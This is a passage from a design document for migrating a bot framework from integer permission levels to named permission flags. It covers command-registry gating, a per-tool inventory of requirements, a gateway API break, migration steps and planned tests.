steps and leave side effects partially applied; it doesn't run.

Per-tool-call gating still applies underneath: a job that does run has
every tool call inside it checked against the creator's *current*
`effective_permissions()`, which the cron v2 rewrite already re-resolves at
run time (cron:583-596, project memory `project_cron_rewrite.md`). The
coarse switch and the fine gating compose rather than substituting for each
other.

---

## 9. The slash-command seam

There are **three** command paths today, not one.

**Path A — `CommandRegistry` (`utils/commands.py`).** `register()` takes
`namespace, sub, handler, help, params` and **no permission argument at
all**. That absence is the direct cause of sysops enforcing
`model_min_permission` by hand at sysops:216, and of `/memory librarian`
and `/memory stats` (memory:394, 406) being reachable by anyone who can
talk to the bot.

```python
def register(self, namespace, sub, handler, *, help="", params=None,
             required_permissions: set[Permission] | None = None) -> None:
```

with the check in `dispatch()` before the handler runs, using the caller
resolved from `context`. Same expand-the-requirement rule, same
explicit-`None`, same startup assertion.

This **gates commands that are ungated today**: `/memory librarian`
triggers a real workload and moves behind `MEMORY_WRITE`; `/memory stats`
behind `MEMORY_READ`. Intended, but a behaviour change, not a translation.

**Path B — `runtime.py:239-245`**: `/user modify_permissions`, `/user
info`, `/user rename` through the same registry → `ROOT`, `USER_READ`,
`ROOT`. `/user modify_permissions` takes `<username> <permission>
<true|false>`, granting or revoking one bool on the target's
`permission_overrides` (§2).

**Path C — Discord's directly-registered commands
(`bridges/discord/commands.py:42-54`).** `/reset` and `/shutdown` are built
straight onto the `discord.app_commands` tree, bypassing `CommandRegistry`
entirely, gating via `bridge._can_reset`. They need porting explicitly —
the registry fix does not reach them.

| today | becomes |
|---|---|
| `reset_requires_permission: 75` → `/reset` | `MANAGE_CTX` |
| `reset_requires_permission: 75` → `/shutdown` | `ROOT` |
| `dm_requires_permission: 75` | `DM_ACCESS` |
| `model_min_permission: 75` → `/model` | `MODEL_SWAP` |
| `model_min_permission: 75` → `set_active_model` tool | `MODEL_SWAP` |

The last row is the point of fixing this seam: `set_active_model` and
`/model` require the *same named bool* through two entry points, instead of
the same int through two hand-written comparisons that can drift.

`/reset` and `/shutdown` share `_can_reset` today, so killing the gateway
is gated identically to clearing a conversation. They separate here.

`DM_ACCESS` is the least capability-shaped member of the enum: it gates
whether a user may converse at all, upstream of every tool call. It fits,
but it's a different kind of thing from the rest.

---

## 10. Full int-retirement inventory

### 10.1 Tool registrations

| module | tool(s) | today | becomes |
|---|---|---|---|
| filesystem | `view`, `grep`, `glob_search` | 25 | `FILE_READ` |
| filesystem | `write_file` | 30 | `FILE_WRITE` |
| filesystem | `edit_file` | 30 | `FILE_READ + FILE_WRITE` |
| shell | `shell` | 30 | dynamic (§5) |
| web | 9 tools | 25-40 | §7 |
| concurrency | `spawn_fork`, `nudge_fork` | 50 | `MANAGE_CTX` |
| memory | librarian_common tools | 0 | `MEMORY_READ` |
| memory | 2 tools at memory:563,565 | 25 | `MEMORY_READ` |
| memory | `call_librarian` | 35 | `MEMORY_WRITE` |
| rag | `rag_search`, `rag_list_databanks` | 25 | **ungated** |
| rag | `set_auto_rag_databanks` | 25 | `MANAGE_CTX` |
| present | `present` | 25 + internal 40 | `FILE_READ`, dynamic `+ ROOT` (§7.1) |
| skills | `use_skill`, `collapse_skill_categories` | 25 | **ungated** |
| sysops | `user_list`, `user_info` | 50 | `USER_READ` |
| sysops | `user_modify_permissions` | 50 | `ROOT` |
| sysops | `user_rename`, `user_merge` | 100 | `ROOT` |
| sysops | `set_active_model` | 75 | `MODEL_SWAP` |
| cron | `add_cron` | `min_create` | `CRON_CREATE` |
| cron | `list_cron` | 0 | **ungated** |
| cron | `remove_cron` | 0 | `CRON_ADMIN` for others' jobs, ungated for own |
| anima | `generate_image_anima` | 25 | `IMAGE_GEN` |

### 10.2 Non-tool int readers

| site | today | becomes |
|---|---|---|
| `cron` × 3 thresholds | 0 / 25 / 90 | §8 |
| `sysops:216`, `:472` | `model_min_permission` | `MODEL_SWAP` via §9 |
| `present:55`, `:93` | direct `caller.permission_level`, `>= 40` | §7.1 |
| `discord/bridge.py:_is_allowed_dm` | 75 | `DM_ACCESS` |
| `discord/bridge.py:_can_reset` | 75 | `MANAGE_CTX` / `ROOT` |
| `equipment_manifest` | `trusted_threshold: 90` | `EQUIPMENT_TRUSTED` (§10.3) |
| `gateway` user-create / user-elevate | body `permission_level` | user-create takes no body; user-elevate takes `{"reset": true}` or nothing (§10.4) |
| `commands/launch.py:161-180` | elevate to 100 | grant every `Permission` via `permission_overrides` (§2) |
| `bridges/cli:465` | hardcoded 100 | §10.4 |

### 10.3 `equipment_manifest` is disclosure, not authorisation

`trusted_threshold: 90` doesn't gate an action — it decides whether the
system prompt *tells the agent* about sensitive equipment, DM-only
(equipment_manifest:123, 179). `EQUIPMENT_TRUSTED` is a fine name, but it's
a category of one, and a disclosure flag sitting in the same enum as
authorisation bools invites someone to later assume every `Permission`
gates an action. The member needs a docstring comment saying what it is.

### 10.4 The gateway API breaks cleanly

```
POST /v1/user/create   {}                     → { "username" }
POST /v1/user/elevate  {}                     → { "username", "admin": true }
POST /v1/user/elevate  { "reset": true }       → { "username", "admin": false }
GET  /v1/user/{username}                       → { "username", "admin" }
```

No compatibility shim, no accepting `permission_level` or a `template` body
field for a release. A clean break makes unmigrated callers fail loudly at
the first request instead of silently taking a default; that's the
cheapest way to find the ones not in this inventory. `admin` means "every
`Permission` bool is set `true` in this user's `permission_overrides`" —
there's no tier name to report.

Known in-tree callers: `commands/launch.py`, the CLI bridge, the onboarding
flow. `bridges/cli:465` hardcodes `"permission_level": 100` on every
message, i.e. the CLI is implicitly the operator — that becomes the caller
resolving to their real identity and, if not yet elevated, being prompted
to grant themselves every permission via `/v1/user/{username}/elevate`,
which does mean the CLI stops being unconditionally omnipotent.

---

## 11. Migration order

The int is retired at the **end**. Steps 1-9 run with both systems present
so nothing breaks mid-flight; step 10 removes the column once nothing reads
it.

1. `permissions.py` — enum, `_IMPLIES`, `expand()`, §6.1's definition as
   the module docstring, §1.1's `ROOT` warning and §6.5's `BACKEND_EXEC`
   warning on their members.
2. Config: `permissions.template` schema and loader — one flat mapping, no
   `templates` dict, no `default_template`.
3. `users/models.py` + `users/store.py`: the one `permission_overrides`
   column, the two-hop migration guard (§2.1 — `permission_level` int, and
   the `permission_template` + `permission_overrides` shape), `effective_permissions()`,
   unknown-key fallback (no unknown-template fallback needed — there's no
   per-user template name anymore).
4. `tool_handling/handler.py`: both new params, enforcement block,
   arg-coercion reorder, §3.1 warn-and-ignore, §3.2 listing rule, startup
   assertion. `min_permission` still honoured here.
5. `utils/commands.py`: `required_permissions` on `register()` + check in
   `dispatch()` (§9 path A).
6. `modules/filesystem` — reference case → verify a `FILE_READ`-only user
   is denied `write_file`.
7. `modules/web` — exercises the network bools end to end → verify a
   `NETWORK_READ`-only user can `open_url` and is denied `click`.
8. `modules/shell` — §5.1's minimal table.
9. Remaining modules (incl. `present`'s §7.1 rewrite) + §9 paths B and C +
   §10.2 non-tool readers + §10.4's API break.
10. **Retire the int**: §2.1 backfill, drop `permission_level` from the
    model, DDL, and gateway, and `min_permission` from `register_tool` and
    the config schema. A grep for `permission_level` returning nothing
    outside the migration script is the completion criterion.
11. Tests: extend `tests/test_tool_handler.py` (static + callable
    `required_permissions`, override precedence, classifier-raises→deny)
    and `tests/test_users_store.py` (`permission_overrides` round-trip,
    both migration hops from §2.1, unknown-key drop); add
    `tests/test_permissions.py` for `effective_permissions()` merge logic
    and `expand()` — including the requirement-not-grant assertion from
    §1.2, the subtlety a future refactor is most likely to get backwards;
    add a command-registry gating test for §9 and a `present` system-file
    escalation test for §7.1.

Per project memory (`reference_running_tests.md`), check the Python version
and the optional dep before reading any failure count from this suite.

---

## Deliberate deferrals

Not open questions — decisions to revisit later, recorded so they don't
look like oversights.

- **The shell tag table is minimal on purpose** (§5.1). Commands get
  promoted out of `UNTRUSTED_EXEC` as real usage justifies it, one at a
  time. Expect the first round of promotions shortly after step 8, and
  expect `python`/`node` to be the first asked for.
- **Network-layer egress enforcement** (§6.4). The bools are not an
  exfiltration boundary; a proxy on the sandbox network would be. Separate
  work.
- **`manage_browser` at `NETWORK_WRITE`** (§7) is a coarse fit — it's
  lifecycle, not a request. Revisit if the grant proves wrong in practice.
